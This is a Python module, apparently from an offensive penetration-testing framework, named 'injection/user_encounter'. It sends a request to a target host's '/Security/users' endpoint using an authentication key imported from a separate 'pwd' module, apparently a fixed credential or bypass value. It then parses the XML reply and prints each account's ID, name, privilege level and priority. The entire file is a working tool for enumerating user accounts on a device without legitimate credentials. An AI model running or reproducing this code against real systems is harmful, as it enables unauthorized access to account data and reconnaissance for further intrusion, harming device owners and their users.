from xml.etree.ElementTree import Element
import requests
from requests.models import Response

from base import core
from injection.pwd import AUTH_KEY

def get_base_url(addr: str) -> str:
    return f"http://{addr}/Security/users?auth={AUTH_KEY}"

def fetch_users(addr: str) -> Response:
    data = requests.get(get_base_url(addr=addr))
    if not data:
        print("[!] Error: Fetching incomplete.")
        return None
    return data

class UserEncounterModule(core.BaseModule):
    def __init__(self) -> None:
        super().__init__("/injection/user_encounter", 1)

        self.RHOST = 0

    def _set_(self, a: str):
        if a[1] in ["RHOST", "rhost"]:
            self.set_option(0, str(a[2]))
            print(" " + f"RHOST → {self.get_option(0)}\n")
    
    def run(self):
        if not core.nonNull(self.get_option(0)):
            print(" [!] Error: host not specified\n")
            return

        print("\n [*] Loading...\n")
        data = fetch_users(self.get_option(0))
        if not data:
            return
        else:
            #print(data.text)
            elem = core.parse(data.text)
            for user in elem:
                if user:
                    try:
                        print(" [#] Encountered an user:")
                        print(" └───┐")
                        print(f"     ├── ID: {user[0].text}")
                        print(f"     ├── Name: {user[1].text}")
                        print(f"     ├── Level: {user[5].text}")
                        print(f"     └── Priority: {user[2].text}\n")
                    except:
                        print("[!] Error: cannot read input\n")
            print("\n[*] Successfully loaded!\n")
        